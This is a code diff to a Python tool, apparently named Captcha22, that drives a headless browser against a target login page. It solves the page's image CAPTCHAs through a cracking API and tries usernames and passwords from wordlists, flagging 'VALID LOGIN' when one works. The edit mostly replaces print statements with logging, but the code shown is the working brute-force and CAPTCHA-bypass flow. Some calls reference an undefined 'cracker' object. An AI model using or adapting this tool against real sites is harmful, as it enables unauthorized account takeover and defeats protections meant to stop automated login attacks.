@@ -4,6 +4,8 @@ import time
 from pyppeteer import launch
 import argparse
 import asyncio
+import logging
+
 if __name__ == "__main__":
     from captcha_cracking import Cracker
 else:
@@ -16,7 +18,9 @@ class PyppeteerCracker:
                  use_local=False, input_dir="./input/", output="./output/", image_type="png", filter_low=130,
                  filter_high=142, captcha_id=None, check_captcha="What code is in the image",
                  check_login="Password", verify_login="The user name or password you entered isn't correct. Try entering it again",
-                 username_field="username", password_field="password", captcha_field="ans", attacking_url=None, username_file=None, password_file=None):
+                 username_field="username", password_field="password", captcha_field="ans", attacking_url=None, username_file=None, password_file=None, logger = logging.getLogger("Captcha22 Cracker")):
+
+        self.logger = logger
 
 
         self.users = []
@@ -57,7 +61,7 @@ class PyppeteerCracker:
         self.password_field = password_field
         self.captcha_field = captcha_field
 
-        self.cracker = Cracker(server_url, server_path, server_port, username, password, session_time, use_hashes, use_filter, use_local, input_dir, output, image_type, filter_low, filter_high, captcha_id)
+        self.cracker = Cracker(server_url, server_path, server_port, username, password, session_time, use_hashes, use_filter, use_local, input_dir, output, image_type, filter_low, filter_high, captcha_id, self.logger)
 
     async def check_on_captcha_page(self, page):
         check_for_captcha = self.check_captcha
@@ -87,7 +91,7 @@ class PyppeteerCracker:
         input("Enter to continue: ")
 
     async def login(self, page, username, password):
-        print("Testing user: "+str(username))
+        self.logger.info("Testing user: "+str(username))
 
         await page.click('input[name='+self.username_field+']')
         time.sleep(0.1)
@@ -107,27 +111,27 @@ class PyppeteerCracker:
         await page.waitForNavigation()
 
         if await self.check_login_failed(page):
-            print("Login failed")
+            self.logger.info("Login failed")
             return False
         else:
             if (await self.check_on_captcha_page(page)):
-                print("Back to captcha page")
+                self.logger.info("Back to captcha page")
                 return False
 
-        print("VALID LOGIN ???")
+        self.logger.info("VALID LOGIN ???")
         return True
 
     async def flow(self, page, username, password):
         await page.goto(self.attacking_url)
         while (await self.check_on_captcha_page(page)):
-            print("Waiting for captcha")
+            self.logger.info("Waiting for captcha")
             img = await page.xpath('/html/body/img')
             img_source = await page.evaluate('(img) => img.src', img[0])
 
             # Send image to API
             captcha = self.cracker.solve_captcha_b64(img_source)
 
-            print("Submitting captcha as: " + str(captcha))
+            self.logger.info("Submitting captcha as: " + str(captcha))
             await page.type('#'+self.captcha_field, captcha)
             await page.keyboard.press('Enter')
             time.sleep(0.5)
@@ -136,16 +140,16 @@ class PyppeteerCracker:
             await page.waitForNavigation()
 
             if await self.check_on_login_page(page):
-                print("CAPTCHA valid")
+                self.logger.info("CAPTCHA valid")
                 cracker.get_captcha_feedback(True)
 
                 # login
                 await self.login(page, username, password)
             else:
-                print("Invalid CAPTCHA")
+                self.logger.info("Invalid CAPTCHA")
                 cracker.get_captcha_feedback(False)
 
-        print("Didn't ask for captcha")
+        self.logger.info("Didn't ask for captcha")
         await self.login(page, username, password)
 
     async def main(self):
